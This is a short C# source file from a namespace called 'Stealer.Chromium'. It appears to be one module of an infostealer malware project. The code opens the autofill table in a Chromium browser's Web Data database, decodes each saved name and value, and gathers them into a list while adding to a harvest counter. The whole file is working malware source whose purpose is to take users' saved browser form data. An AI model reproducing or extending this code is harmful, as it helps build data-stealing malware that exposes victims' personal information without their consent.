using System.IO;
using System.Collections.Generic;

namespace Stealer.Chromium
{
    internal sealed class Autofill
    {
        /// <summary>
        /// Get Autofill values from chromium based browsers
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with autofill</returns>
        public static List<AutoFill> Get(string sWebData)
        {
            try
            {
                List<AutoFill> acAutoFillData = new List<AutoFill>();

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sWebData, "autofill");
                if (sSQLite == null)
                    return acAutoFillData;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    AutoFill aFill = new AutoFill();

                    aFill.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    aFill.sValue = Crypto.GetUTF8(sSQLite.GetValue(i, 1));

                    Counter.AutoFill++;
                    acAutoFillData.Add(aFill);

                }

                return acAutoFillData;
            }
            catch { return new List<AutoFill>(); }
        }
    }
}
